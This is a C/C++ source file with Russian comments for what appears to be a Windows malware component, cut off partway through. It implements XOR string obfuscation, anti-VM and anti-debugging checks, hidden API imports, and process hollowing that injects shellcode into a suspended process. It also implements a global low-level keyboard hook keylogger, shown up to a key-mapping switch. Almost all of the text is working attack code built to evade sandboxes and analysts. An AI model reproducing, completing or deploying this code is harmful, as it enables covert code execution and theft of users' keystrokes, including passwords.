#include "injector.h"
#include <stdio.h>  // Для printf / sprintf
#include <stdlib.h> // Для malloc / free
#include <string.h> // Для strlen / strcpy
#include <windows.h>
#include <winternl.h> // Для структур PEB
#include <iphlpapi.h> // Для GetAdaptersInfo
#include <psapi.h>    // Для EnumProcesses (хотя пока не используем)
#include <intrin.h>   // Для __cpuid
#include <tlhelp32.h> // Для поиска процессов (хотя можно и без него, через GetShellWindow)
#include <userenv.h>  // Для CreateProcessWithTokenW
#include <vector>     // Для буфера логов (временное решение)
#include <string>     // Для буфера логов
#include <mutex>      // Для защиты буфера логов

#pragma comment(lib, "iphlpapi.lib") // Линковка с библиотекой для GetAdaptersInfo
#pragma comment(lib, "Userenv.lib") // Линковка с userenv.lib

// --- Макрос и функция для XOR-обфускации строк ---
#define XOR_KEY 0xAE // Простой ключ, можно сделать сложнее

// Функция для "деобфускации" строки на лету
char* deobfuscate(const char* obfuscated_str, size_t len) {
    char* deobfuscated = (char*)malloc(len + 1);
    if (!deobfuscated) return NULL; 
    for(size_t i = 0; i < len; ++i) {
        deobfuscated[i] = obfuscated_str[i] ^ XOR_KEY;
    }
    deobfuscated[len] = '\0';
    return deobfuscated;
}

// Вспомогательная структура для хранения обфусцированной строки и ее длины
struct ObfuscatedString {
    const char* data;
    size_t length;
};

// Макрос для создания обфусцированной строки во время компиляции
// Использование: OBFUSCATED("My Secret String")
#define OBFUSCATED(str)                                     \
    ([]() -> ObfuscatedString {                             \
        constexpr size_t len = sizeof(str) - 1;             \
        char obfuscated[len + 1];                           \
        for(size_t i = 0; i < len; ++i) {                   \
            obfuscated[i] = str[i] ^ XOR_KEY;             \
        }                                                   \
        obfuscated[len] = 0; /* Null terminator не XORим */ \
        /* Статическая переменная для хранения данных */      \
        /* Это не идеально, но просто для примера */       \
        /* В реальном коде лучше размещать в .data секции */ \
        static char storage[len + 1];                       \
        memcpy(storage, obfuscated, len + 1);             \
        return { storage, len };                            \
    }()) 

// Прототип для NtUnmapViewOfSection (позже будем получать динамически)
/*
typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
);
*/

// --- Вспомогательная функция для получения текста ошибки Windows ---
char* get_windows_error_message(DWORD errorCode) {
    LPSTR messageBuffer = NULL;
    // ОБФУСЦИРОВАННАЯ СТРОКА
    ObfuscatedString fmtAlloc = OBFUSCATED("Error code %lu: %s");
    ObfuscatedString fmtCode = OBFUSCATED("Windows API Error Code: %lu");

    size_t size = FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL, errorCode, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);

    char* finalMsg = NULL;
    if (size > 0) {
        char* fmtAlloc_deob = deobfuscate(fmtAlloc.data, fmtAlloc.length);
        if (!fmtAlloc_deob) { /* Обработка ошибки malloc */ return NULL; }
        size_t requiredSize = snprintf(NULL, 0, fmtAlloc_deob, errorCode, messageBuffer) + 1; 
        finalMsg = (char*)malloc(requiredSize);
        if (finalMsg) {
            snprintf(finalMsg, requiredSize, fmtAlloc_deob, errorCode, messageBuffer);
        }
        free(fmtAlloc_deob);
        LocalFree(messageBuffer); 
    } else {
        char* fmtCode_deob = deobfuscate(fmtCode.data, fmtCode.length);
         if (!fmtCode_deob) { /* Обработка ошибки malloc */ return NULL; }
        size_t requiredSize = snprintf(NULL, 0, fmtCode_deob, errorCode) + 1;
        finalMsg = (char*)malloc(requiredSize);
        if(finalMsg) {
            snprintf(finalMsg, requiredSize, fmtCode_deob, errorCode);
        }
        free(fmtCode_deob);
    }
    return finalMsg; 
}

// --- Функция для проверки базовых признаков виртуального окружения ---
BOOL IsVMEnvironmentDetected() {
    BOOL isVM = FALSE;

    // 1. Проверка MAC-адреса известных вендоров VM
    PIP_ADAPTER_INFO pAdapterInfo = NULL;
    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    pAdapterInfo = (IP_ADAPTER_INFO *)malloc(ulOutBufLen);
    if (pAdapterInfo == NULL) {
        printf("[Anti-VM] Failed to allocate memory for GetAdaptersInfo\n");
        // Не критично, продолжаем другие проверки
    } else {
        // Вызываем GetAdaptersInfo с начальным буфером
        if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
            free(pAdapterInfo);
            pAdapterInfo = (IP_ADAPTER_INFO *)malloc(ulOutBufLen);
            if (pAdapterInfo == NULL) {
                 printf("[Anti-VM] Failed to allocate memory for GetAdaptersInfo (retry)\n");
                 // Не критично
            }
        }

        if (pAdapterInfo && GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
            PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
            while (pAdapter) {
                // VMware MAC prefixes
                if ((pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x05 && pAdapter->Address[2] == 0x69) ||
                    (pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x0C && pAdapter->Address[2] == 0x29) ||
                    (pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x1C && pAdapter->Address[2] == 0x14) ||
                    (pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x50 && pAdapter->Address[2] == 0x56)) {
                    printf("[Anti-VM] VMware MAC address detected.\n");
                    isVM = TRUE;
                    break;
                }
                // VirtualBox MAC prefix
                if (pAdapter->Address[0] == 0x08 && pAdapter->Address[1] == 0x00 && pAdapter->Address[2] == 0x27) {
                     printf("[Anti-VM] VirtualBox MAC address detected.\n");
                     isVM = TRUE;
                     break;
                }
                 // Microsoft Hyper-V / Virtual PC
                if ((pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x03 && pAdapter->Address[2] == 0xFF) || // Hyper-V
                    (pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x15 && pAdapter->Address[2] == 0x5D) || // Hyper-V new
                    (pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x22 && pAdapter->Address[2] == 0x48)) { // Virtual PC
                    printf("[Anti-VM] Microsoft Virtualization MAC address detected.\n");
                    isVM = TRUE;
                    break;
                }
                pAdapter = pAdapter->Next;
            }
        }
        if (pAdapterInfo) {
            free(pAdapterInfo);
        }
        if (isVM) return TRUE; // Если нашли по MAC, выходим
    }


    // 2. Проверка реестра на ключи/значения, связанные с VM
    HKEY hKey;
    LONG regResult;
    CHAR value[256];
    DWORD bufferSize = sizeof(value);
    const char* regPaths[] = {
        "HARDWARE\Description\System\BIOS", // Check SystemBiosVersion, BaseBoardProduct, etc.
        "HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0", // Check Identifier
        "SYSTEM\CurrentControlSet\Services\Disk\Enum" // Check device names
    };
    const char* vmStrings[] = {"VMWARE", "VBOX", "VIRTUALBOX", "QEMU", "HYPER-V", "XEN", "VIRTUAL"};

    for (int i=0; i < sizeof(regPaths)/sizeof(regPaths[0]); ++i) {
         regResult = RegOpenKeyExA(HKEY_LOCAL_MACHINE, regPaths[i], 0, KEY_READ, &hKey);
         if (regResult == ERROR_SUCCESS) {
            // Проверяем значения в открытом ключе
            DWORD index = 0;
            CHAR valueName[256];
            DWORD valueNameSize = sizeof(valueName);
            DWORD valueType;
            DWORD dataSize = sizeof(value);

            while (RegEnumValueA(hKey, index++, valueName, &valueNameSize, NULL, &valueType, (LPBYTE)value, &dataSize) == ERROR_SUCCESS) {
                if (valueType == REG_SZ) { // Ищем только строковые значения
                    CharUpperA(value); // Приводим к верхнему регистру для сравнения без учета регистра
                    for (int j=0; j < sizeof(vmStrings)/sizeof(vmStrings[0]); ++j) {
                        if (strstr(value, vmStrings[j]) != NULL) {
                             printf("[Anti-VM] VM signature '%s' found in Registry (%s -> %s).\n", vmStrings[j], regPaths[i], valueName);
                             isVM = TRUE;
                             RegCloseKey(hKey);
                             return TRUE;
                        }
                    }
                }
                // Сбрасываем размеры для следующей итерации
                valueNameSize = sizeof(valueName);
                dataSize = sizeof(value);
            }
            RegCloseKey(hKey);
         } // else: ключ не найден, это нормально, пробуем следующий
    }
    if (isVM) return TRUE;


    // 3. Проверка наличия известных файлов/драйверов VM
    const char* vmFiles[] = {
        "C:\Windows\System32\drivers\VBoxGuest.sys",
        "C:\Windows\System32\drivers\VBoxMouse.sys",
        "C:\Windows\System32\drivers\VBoxSF.sys",
        "C:\Windows\System32\drivers\VBoxVideo.sys",
        "C:\Windows\System32\vboxdisp.dll",
        "C:\Windows\System32\vboxhook.dll",
        "C:\Windows\System32\vboxogl.dll",
        "C:\Windows\System32\vboxoglarrayspu.dll",
        "C:\Windows\System32\vboxoglcrutil.dll",
        "C:\Windows\System32\vboxoglerrorspu.dll",
        "C:\Windows\System32\vboxoglfeedbackspu.dll",
        "C:\Windows\System32\vboxoglpackspu.dll",
        "C:\Windows\System32\vboxoglpassthroughspu.dll",
        "C:\Windows\System32\vboxservice.exe",
        "C:\Windows\System32\vboxtray.exe",
        "C:\Windows\System32\drivers\vmhgfs.sys",
        "C:\Windows\System32\drivers\vmci.sys",      // VMware VMCI Bus Driver
        "C:\Windows\System32\drivers\vsock.sys",     // VMware vSockets Driver
        "C:\Windows\System32\drivers\vmmouse.sys",
        "C:\Windows\System32\drivers\vmx_svga.sys",
        "C:\Windows\System32\drivers\vmxnet.sys",
        "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe",
        "C:\Program Files\Oracle\VirtualBox Guest Additions\",
        "C:\Windows\System32\drivers\hyperkbd.sys", // Hyper-V Keyboard
        "C:\Windows\System32\drivers\vmbus.sys",    // Hyper-V Virtual Machine Bus
        "C:\Windows\System32\drivers\Vhdmp.sys",    // Hyper-V VHD Driver
        "C:\Windows\System32\drivers\vpcbus.sys",   // Virtual PC Bus Driver
        "C:\Windows\System32\drivers\vpc-s3.sys",   // Virtual PC S3 Video Driver
        "C:\Windows\System32\drivers\xen.sys",      // Xen Driver
    };

    for (int i = 0; i < sizeof(vmFiles) / sizeof(vmFiles[0]); ++i) {
        DWORD fileAttr = GetFileAttributesA(vmFiles[i]);
        if (fileAttr != INVALID_FILE_ATTRIBUTES) {
            // Проверяем, не является ли это директорией (для случаев типа Program Files)
             if (!(fileAttr & FILE_ATTRIBUTE_DIRECTORY) || (strstr(vmFiles[i], ".sys") || strstr(vmFiles[i], ".dll") || strstr(vmFiles[i], ".exe")) ) {
                 printf("[Anti-VM] VM-related file/driver detected: %s\n", vmFiles[i]);
                 isVM = TRUE;
                 return TRUE;
             }
              // Если это директория, проверяем существование
             if (fileAttr & FILE_ATTRIBUTE_DIRECTORY && strstr(vmFiles[i], "Additions") ) { // Пример для папки Guest Additions
                  printf("[Anti-VM] VM-related directory detected: %s\n", vmFiles[i]);
                  isVM = TRUE;
                  return TRUE;
             }
        }
    }

    // 4. Проверка CPUID (простейший вариант)
    // Лист 0x40000000 используется многими гипервизорами для идентификации
    int cpuInfo[4];
    __cpuid(cpuInfo, 0x40000000);
    char hypervisorName[13];
    memcpy(hypervisorName + 0, &cpuInfo[1], 4); // EBX
    memcpy(hypervisorName + 4, &cpuInfo[2], 4); // ECX
    memcpy(hypervisorName + 8, &cpuInfo[3], 4); // EDX
    hypervisorName[12] = '\0';

    if (strcmp(hypervisorName, "VMwareVMware") == 0 ||
        strcmp(hypervisorName, "KVMKVMKVM") == 0 ||
        strcmp(hypervisorName, "VBoxVBoxVBox") == 0 ||
        strcmp(hypervisorName, "XenVMMXenVMM") == 0 ||
        strcmp(hypervisorName, "Microsoft Hv") == 0 || // Может быть   раньше
        strcmp(hypervisorName, "Hyper-V") == 0) { // Некоторые версии могут так отвечать
         printf("[Anti-VM] Hypervisor detected via CPUID leaf 0x40000000: %s\n", hypervisorName);
         isVM = TRUE;
         return TRUE;
    }


    // Дополнительно: Проверка имени компьютера/пользователя (менее надежно)
    // char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    // DWORD computerNameSize = sizeof(computerName);
    // if (GetComputerNameA(computerName, &computerNameSize)) {
    //     CharUpperA(computerName);
    //     if (strstr(computerName, "SANDBOX") || strstr(computerName, "MALTEST") || strstr(computerName, "VM")) {
    //          printf("[Anti-VM] Suspicious computer name: %s\n", computerName);
    //          isVM = TRUE; // Может быть ложным срабатыванием
    //          // return TRUE; // Не выходим сразу, возможно
    //     }
    // }

    printf("[Anti-VM] No definitive VM indicators found by basic checks.\n");
    return isVM;
}

// --- Функция для проверки наличия отладчика ---
BOOL IsDebuggerPresentDetected() {
    BOOL isDebugging = FALSE;
    ObfuscatedString msg1 = OBFUSCATED("[Anti-Debug] IsDebuggerPresent() returned TRUE.\n");
    ObfuscatedString msg2 = OBFUSCATED("[Anti-Debug] CheckRemoteDebuggerPresent() detected a remote debugger.\n");
    ObfuscatedString msg3 = OBFUSCATED("[Anti-Debug] PEB->BeingDebugged flag is set.\n");
    ObfuscatedString msg4 = OBFUSCATED("[Anti-Debug] No debugger detected by basic checks.\n");

    // 1. Простая проверка через IsDebuggerPresent() (читает флаг в PEB)
    if (IsDebuggerPresent()) {
        char* deob_msg1 = deobfuscate(msg1.data, msg1.length);
        if (deob_msg1) { printf(deob_msg1); free(deob_msg1); }
        isDebugging = TRUE;
        return TRUE; // Если нашли, сразу выходим
    }

    // 2. Проверка на удаленный отладчик
    BOOL isRemoteDebuggerPresent = FALSE;
    if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &isRemoteDebuggerPresent) && isRemoteDebuggerPresent) {
        char* deob_msg2 = deobfuscate(msg2.data, msg2.length);
         if (deob_msg2) { printf(deob_msg2); free(deob_msg2); }
        isDebugging = TRUE;
        return TRUE; // Если нашли, сразу выходим
    }

    // 3. Проверка флага BeingDebugged в PEB вручную (альтернатива IsDebuggerPresent)
    //    Это может обойти некоторые хуки на IsDebuggerPresent
#ifdef _WIN64
    PEB* pPeb = (PEB*)__readgsqword(0x60); // Получаем PEB для 64-бит
#else
    PEB* pPeb = (PEB*)__readfsdword(0x30); // Получаем PEB для 32-бит
#endif
    if (pPeb->BeingDebugged) {
         char* deob_msg3 = deobfuscate(msg3.data, msg3.length);
         if (deob_msg3) { printf(deob_msg3); free(deob_msg3); }
         isDebugging = TRUE;
         return TRUE;
    }

    // TODO: Добавить более продвинутые техники (например, проверка времени выполнения, аппаратные точки останова)

    char* deob_msg4 = deobfuscate(msg4.data, msg4.length);
    if (deob_msg4) { printf(deob_msg4); free(deob_msg4); }
    return isDebugging;
}

// --- Типы указателей на функции WinAPI для скрытия импортов и UAC Bypass ---
// Уже есть:
typedef BOOL (WINAPI *Type_CreateProcessA)(
    LPCSTR lpApplicationName,
    LPSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCSTR lpCurrentDirectory,
    LPSTARTUPINFOA lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
);

// Новые для UAC Bypass:
typedef HANDLE (WINAPI *Type_OpenProcess)(
    DWORD dwDesiredAccess,
    BOOL bInheritHandle,
    DWORD dwProcessId
);

typedef BOOL (WINAPI *Type_OpenProcessToken)(
    HANDLE ProcessHandle,
    DWORD DesiredAccess,
    PHANDLE TokenHandle
);

typedef BOOL (WINAPI *Type_DuplicateTokenEx)(
    HANDLE hExistingToken,
    DWORD dwDesiredAccess,
    LPSECURITY_ATTRIBUTES lpTokenAttributes,
    SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
    TOKEN_TYPE TokenType,
    PHANDLE phNewToken
);

typedef BOOL (WINAPI *Type_CreateProcessWithTokenW)(
    HANDLE hToken,
    DWORD dwLogonFlags, // LOGON_WITH_PROFILE or 0
    LPCWSTR lpApplicationName,
    LPWSTR lpCommandLine,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
);

typedef BOOL (WINAPI *Type_LookupPrivilegeValueW)(
    LPCWSTR lpSystemName,
    LPCWSTR lpName,
    PLUID lpLuid
);

typedef BOOL (WINAPI *Type_AdjustTokenPrivileges)(
    HANDLE TokenHandle,
    BOOL DisableAllPrivileges,
    PTOKEN_PRIVILEGES NewState,
    DWORD BufferLength,
    PTOKEN_PRIVILEGES PreviousState,
    PDWORD ReturnLength
);

// --- Глобальные указатели на функции ---
// Уже есть:
Type_CreateProcessA ptrCreateProcessA = NULL;

// Новые:
Type_OpenProcess ptrOpenProcess = NULL;
Type_OpenProcessToken ptrOpenProcessToken = NULL;
Type_DuplicateTokenEx ptrDuplicateTokenEx = NULL;
Type_CreateProcessWithTokenW ptrCreateProcessWithTokenW = NULL;
Type_LookupPrivilegeValueW ptrLookupPrivilegeValueW = NULL;
Type_AdjustTokenPrivileges ptrAdjustTokenPrivileges = NULL;

// Новые для Keylogger:
typedef LRESULT (CALLBACK *Type_LowLevelKeyboardProc)(
    int nCode,
    WPARAM wParam,
    LPARAM lParam
);

typedef HHOOK (WINAPI *Type_SetWindowsHookExW)(
    int idHook,
    HOOKPROC lpfn,
    HINSTANCE hMod, // Должен быть HINSTANCE DLL
    DWORD dwThreadId // 0 для глобального хука
);

typedef BOOL (WINAPI *Type_UnhookWindowsHookEx)(
    HHOOK hhk
);

typedef LRESULT (WINAPI *Type_CallNextHookEx)(
    HHOOK hhk,
    int nCode,
    WPARAM wParam,
    LPARAM lParam
);

typedef SHORT (WINAPI *Type_GetAsyncKeyState)(
    int vKey
);

// Функции для цикла сообщений (могут быть уже в kernel32/user32)
typedef BOOL (WINAPI *Type_GetMessageW)(
    LPMSG lpMsg,
    HWND hWnd,
    UINT wMsgFilterMin,
    UINT wMsgFilterMax
);

typedef BOOL (WINAPI *Type_TranslateMessage)(
    const MSG *lpMsg
);

typedef LRESULT (WINAPI *Type_DispatchMessageW)(
    const MSG *lpMsg
);

// --- Глобальные переменные для кейлоггера ---
HHOOK g_hKeyboardHook = NULL;
std::vector<std::string> g_keyBuffer; // Простой буфер для логов
std::mutex g_bufferMutex;           // Мьютекс для защиты буфера
BOOL g_keyloggerRunning = FALSE;
HANDLE g_messageLoopThread = NULL;

// --- Функция для получения адресов нужных функций --- 
BOOL InitializeApiPointers() {
    // Получаем адреса для Process Hollowing (если еще не получены)
    if (!ptrCreateProcessA) {
        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        if (!hKernel32) return FALSE; 
        ptrCreateProcessA = (Type_CreateProcessA)GetProcAddress(hKernel32, "CreateProcessA");
        if (!ptrCreateProcessA) return FALSE;
        // Добавим сюда получение других функций из kernel32, если понадобятся
    }

    // Получаем адреса для UAC Bypass (пропускаем, т.к. код удален)
    /*
    if (!ptrOpenProcess || ...) {
        ...
    }
    */

    // Получаем адреса для Keylogger
    if (!ptrSetWindowsHookExW || !ptrUnhookWindowsHookEx || !ptrCallNextHookEx || 
        !ptrGetAsyncKeyState || !ptrGetMessageW || !ptrTranslateMessage || !ptrDispatchMessageW)
    {
        HMODULE hUser32 = GetModuleHandleA("user32.dll");
        if (!hUser32) { 
            printf("[InitApi] Failed to get module handle for user32.dll\n");
            return FALSE; 
        }

        ptrSetWindowsHookExW = (Type_SetWindowsHookExW)GetProcAddress(hUser32, "SetWindowsHookExW");
        ptrUnhookWindowsHookEx = (Type_UnhookWindowsHookEx)GetProcAddress(hUser32, "UnhookWindowsHookEx");
        ptrCallNextHookEx = (Type_CallNextHookEx)GetProcAddress(hUser32, "CallNextHookEx");
        ptrGetAsyncKeyState = (Type_GetAsyncKeyState)GetProcAddress(hUser32, "GetAsyncKeyState");
        ptrGetMessageW = (Type_GetMessageW)GetProcAddress(hUser32, "GetMessageW");
        ptrTranslateMessage = (Type_TranslateMessage)GetProcAddress(hUser32, "TranslateMessage");
        ptrDispatchMessageW = (Type_DispatchMessageW)GetProcAddress(hUser32, "DispatchMessageW");

        if (!ptrSetWindowsHookExW || !ptrUnhookWindowsHookEx || !ptrCallNextHookEx || 
            !ptrGetAsyncKeyState || !ptrGetMessageW || !ptrTranslateMessage || !ptrDispatchMessageW) {
            printf("[InitApi] Failed to get one or more API function addresses for keylogger.\n");
            // Можно добавить вывод, каких именно функций не хватает
            return FALSE;
        }
         printf("[InitApi] Keylogger API pointers initialized successfully.\n");
    }

    return TRUE;
}

// --- Реализация основной функции инъекции ---
EXPORT_FUNC int inject_process_hollowing(
    LPCSTR targetProcessPath, 
    const unsigned char* shellcode, 
    DWORD shellcodeSize,
    char** errorMsg) 
{
    *errorMsg = NULL; 
    printf("[Injector] Attempting Process Hollowing: target='%s', shellcodeSize=%lu\n", targetProcessPath, shellcodeSize);

    // Инициализируем указатели на API функции
    if (!InitializeApiPointers()) {
        ObfuscatedString err = OBFUSCATED("Failed to initialize API pointers for Process Hollowing.");
        *errorMsg = deobfuscate(err.data, err.length);
        return 3001; // Custom error code
    }

    if (!targetProcessPath || !shellcode || shellcodeSize == 0) {
        const char* msg = "Invalid parameters provided.";
        *errorMsg = (char*)malloc(strlen(msg) + 1);
        if (*errorMsg) strcpy(*errorMsg, msg);
        return 1; 
    }

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;

    LPVOID remoteMem = NULL;
    BOOL success = FALSE;
    DWORD lastError = 0;

    // 1. Создаем целевой процесс в приостановленном состоянии, используя указатель
    printf("[Injector] Creating suspended process: %s\n", targetProcessPath);
    success = ptrCreateProcessA( // Вызов через указатель
        NULL,                  // No module name (use command line)
        (LPSTR)targetProcessPath, // Command line
        NULL,                  // Process handle not inheritable
        NULL,                  // Thread handle not inheritable
        FALSE,                 // Set handle inheritance to FALSE
        CREATE_SUSPENDED,      // Create the process in a suspended state
        NULL,                  // Use parent's environment block
        NULL,                  // Use parent's starting directory 
        &si,                   // Pointer to STARTUPINFO structure
        &pi                    // Pointer to PROCESS_INFORMATION structure
    );

    if (!success) {
        lastError = GetLastError();
        printf("[Injector] Failed to create process. Error code: %lu\n", lastError);
        *errorMsg = get_windows_error_message(lastError);
        return lastError;
    }
    printf("[Injector] Process created successfully (PID: %lu, TID: %lu)\n", pi.dwProcessId, pi.dwThreadId);

    // --- Этап с NtUnmapViewOfSection пока пропускаем для упрощения ---
    // TODO: Динамически получить адрес NtUnmapViewOfSection из ntdll.dll
    // TODO: Получить ImageBaseAddress из PEB (через GetThreadContext и ReadProcessMemory)
    // TODO: Вызвать NtUnmapViewOfSection(pi.hProcess, imageBaseAddress);
    printf("[Injector] Skipping NtUnmapViewOfSection for now.\n");

    // 2. Выделяем память в удаленном процессе для шеллкода
    printf("[Injector] Allocating memory in remote process (size: %lu bytes)\n", shellcodeSize);
    // TODO: Рассмотреть выделение памяти под PE хедеры, если делаем полный PE injection, а не только shellcode
    remoteMem = VirtualAllocEx(pi.hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteMem == NULL) {
        lastError = GetLastError();
        printf("[Injector] VirtualAllocEx failed. Error code: %lu\n", lastError);
        *errorMsg = get_windows_error_message(lastError);
        TerminateProcess(pi.hProcess, 1); // Завершаем процесс, так как инъекция не удалась
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return lastError;
    }
    printf("[Injector] Memory allocated at address: %p\n", remoteMem);

    // 3. Записываем шеллкод в выделенную память
    printf("[Injector] Writing shellcode to remote process...\n");
    if (!WriteProcessMemory(pi.hProcess, remoteMem, shellcode, shellcodeSize, NULL)) {
        lastError = GetLastError();
        printf("[Injector] WriteProcessMemory failed. Error code: %lu\n", lastError);
        *errorMsg = get_windows_error_message(lastError);
        VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE); // Освобождаем выделенную память
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return lastError;
    }
    printf("[Injector] Shellcode written successfully.\n");

    // 4. Получаем контекст основного потока
    printf("[Injector] Getting thread context...\n");
    if (!GetThreadContext(pi.hThread, &ctx)) {
        lastError = GetLastError();
        printf("[Injector] GetThreadContext failed. Error code: %lu\n", lastError);
        *errorMsg = get_windows_error_message(lastError);
        VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return lastError;
    }
    printf("[Injector] Thread context obtained.\n");

    // 5. Модифицируем точку входа (EIP/RIP) для указания на наш шеллкод
    printf("[Injector] Modifying instruction pointer (EIP/RIP)...\n");
#ifdef _M_IX86 // 32-bit
    ctx.Eip = (DWORD)remoteMem;
    printf("[Injector] New EIP: %p\n", (void*)ctx.Eip);
#elif defined(_M_AMD64) // 64-bit
    ctx.Rip = (DWORD64)remoteMem;
     printf("[Injector] New RIP: %p\n", (void*)ctx.Rip);
#else
    #error "Unsupported architecture (target should be Windows x86 or x64)"
#endif

    // 6. Устанавливаем измененный контекст потока
    printf("[Injector] Setting modified thread context...\n");
    if (!SetThreadContext(pi.hThread, &ctx)) {
        lastError = GetLastError();
        printf("[Injector] SetThreadContext failed. Error code: %lu\n", lastError);
        *errorMsg = get_windows_error_message(lastError);
        VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return lastError;
    }
    printf("[Injector] Thread context set successfully.\n");

    // 7. Возобновляем выполнение основного потока
    printf("[Injector] Resuming target thread...\n");
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        lastError = GetLastError();
        printf("[Injector] ResumeThread failed. Error code: %lu\n", lastError);
        *errorMsg = get_windows_error_message(lastError);
        // Поток уже может быть запущен с неправильным контекстом, но все равно пытаемся очистить
        VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return lastError;
    }

    printf("[Injector] Process Hollowing attempt finished. Thread resumed.\n");

    // Закрываем хендлы
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0; // Успех
}

// --- Реализация функции освобождения памяти ---
EXPORT_FUNC void free_error_message(char* errorMsg) {
    if (errorMsg) {
        printf("[Injector] Freeing error message memory.\n");
        free(errorMsg);
    }
}

// --- Callback функция для клавиатурного хука ---
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *pkhs = (KBDLLHOOKSTRUCT *)lParam;
        
        // Интересуют только события нажатия клавиши (не отпускания)
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            std::string keyString = "";
            DWORD vkCode = pkhs->vkCode;

            // Попробуем получить читаемое имя клавиши
            wchar_t keyNameBuffer[256] = {0};
            BYTE keyboardState[256] = {0}; // Получаем состояние клавиатуры
            GetKeyboardState(keyboardState);

            // Используем ToUnicode для преобразования с учетом раскладки и состояния Shift/Ctrl/Alt
            // Это лучше, чем просто маппинг VK кодов
            int result = ToUnicode(vkCode, pkhs->scanCode, keyboardState, keyNameBuffer, sizeof(keyNameBuffer)/sizeof(wchar_t), 0);
            
            if (result > 0) { // Если удалось получить символ
                 // Конвертируем wchar_t* в std::string (используем UTF-8)
                int utf8Size = WideCharToMultiByte(CP_UTF8, 0, keyNameBuffer, result, NULL, 0, NULL, NULL);
                if (utf8Size > 0) {
                    char* utf8Buffer = new char[utf8Size + 1];
                    WideCharToMultiByte(CP_UTF8, 0, keyNameBuffer, result, utf8Buffer, utf8Size, NULL, NULL);
                    utf8Buffer[utf8Size] = '\0';
                    keyString = utf8Buffer;
                    delete[] utf8Buffer;
                }
            } else { // Если не удалось (служебные клавиши, непечатаемые символы)
                 // Можно добавить обработку специфичных VK_ кодов (Shift, Ctrl, Enter, Backspace и т.д.)
                 switch (vkCode) {
                    case VK_RETURN: keyString = "[ENTER]"; break;
                    case VK_BACK:   keyString = "[BACKSPACE]"; break;
                    case VK_TAB:    keyString = "[TAB]"; break;
                    case VK_SHIFT:  /*keyString = "[SHIFT]";*/ break; // Обычно не логируем сами по себе
                    case VK_LSHIFT: /*keyString = "[LSHIFT]";*/ break;
                    case VK_RSHIFT: /*keyString = "[RSHIFT]";*/ break;
                    case VK_CONTROL:/*keyString = "[CTRL]";*/ break;
                    case VK_LCONTROL:/*keyString = "[LCTRL]";*/ break;
                    case VK_RCONTROL:/*keyString = "[RCTRL]";*/ break;
                    case VK_MENU:   /*keyString = "[ALT]";*/ break; // ALT
                    case VK_LMENU:  /*keyString = "[LALT]";*/ break;
                    case VK_RMENU:  /*keyString = "[RALT]";*/ break;
                    case VK_CAPITAL:keyString = "[CAPSLOCK]"; break;
                    case VK_ESCAPE: keyString = "[ESC]"; break;
                    case VK_SPACE:  keyString = " "; break;
                    case VK_PRIOR:  keyString = "[PGUP]"; break; // Page Up
                    case VK_NEXT:   keyString = "[PGDN]"; break; // Page Down
                    case VK_END:    keyString = "[END]"; break;
                    case VK_HOME:   keyString = "[HOME]"; break;
                    case VK_LEFT:   keyString = "[LEFT]"; break;
                    case VK_UP:     keyString = "[UP]"; break;
                    case VK_RIGHT:  keyString = "[RIGHT]"; break;
                    case VK_DOWN:   keyString = "[DOWN]"; break;
                    case VK_DELETE: keyString = "[DEL]"; break;
                    case VK_INSERT: keyString = "[INS]"; break;
